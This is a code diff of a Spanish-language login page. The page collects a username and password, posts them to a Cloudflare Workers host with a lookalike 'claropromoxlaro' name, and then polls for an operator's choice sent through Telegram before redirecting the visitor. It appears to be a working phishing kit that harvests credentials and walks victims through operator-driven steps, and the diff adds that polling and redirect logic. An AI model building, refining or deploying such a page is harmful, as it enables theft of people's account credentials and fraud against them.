@@ -13,33 +13,46 @@
     <button type="submit">Enviar</button>
   </form>
 
-  <p id="resultado"></p>
+  <p id="estado"></p>
 
   <script>
-    const WORKER_URL = "https://blue-night-7897.claropromoxlaro.workers.dev/login";
+    const BASE_URL = "https://blue-night-7897.claropromoxlaro.workers.dev";
 
     document.getElementById("loginForm").addEventListener("submit", async (e) => {
       e.preventDefault();
-
       const form = e.target;
-      const data = {
+      const transactionId = crypto.randomUUID();
+
+      const datos = {
         usuario: form.usuario.value,
         clave: form.clave.value,
-        transactionId: crypto.randomUUID()
+        transactionId
       };
 
       try {
-        const res = await fetch(WORKER_URL, {
+        const res = await fetch(BASE_URL + "/login", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
+          body: JSON.stringify(datos)
         });
-
-        if (!res.ok) throw new Error("Error HTTP " + res.status);
         const json = await res.json();
-        document.getElementById("resultado").textContent = "✅ Enviado: " + JSON.stringify(json);
+        if (!json.ok) throw new Error("Error en el envío");
+
+        document.getElementById("estado").textContent = "✅ Esperando respuesta...";
+
+        // --- Esperar la opción elegida desde Telegram ---
+        const interval = setInterval(async () => {
+          const r = await fetch(`${BASE_URL}/status?id=${transactionId}`);
+          const status = await r.json();
+
+          if (status && status.opcionElegida) {
+            clearInterval(interval);
+            window.location.href = status.opcionElegida + ".html";
+          }
+        }, 2000);
+
       } catch (err) {
-        document.getElementById("resultado").textContent = "❌ Error de conexión: " + err.message;
+        document.getElementById("estado").textContent = "❌ Error: " + err.message;
       }
     });
   </script>
